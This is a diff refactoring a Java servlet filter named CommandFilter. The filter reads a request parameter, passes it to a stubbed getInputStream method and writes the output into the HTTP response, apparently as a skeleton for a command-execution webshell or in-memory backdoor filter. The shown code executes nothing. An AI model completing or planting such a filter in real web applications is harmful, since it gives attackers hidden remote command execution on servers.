@@ -14,26 +14,13 @@ public class CommandFilter implements Filter {
     private static String paramName;
 
     @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
-
-    }
-
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
-    @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
         HttpServletRequest servletRequest = (HttpServletRequest) request;
         HttpServletResponse servletResponse = (HttpServletResponse) response;
-        String cmd = getParam(servletRequest.getParameter(paramName));
         try {
-            if (cmd != null) {
-                InputStream inputStream = getInputStream(cmd);
+            String param = getParam(servletRequest.getParameter(paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -42,14 +29,25 @@ public class CommandFilter implements Filter {
                 }
                 return;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         chain.doFilter(servletRequest, servletResponse);
     }
 
     @Override
-    public void destroy() {
+    public void init(FilterConfig filterConfig) throws ServletException {
+    }
 
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
+    }
+
+    @Override
+    public void destroy() {
     }
 }
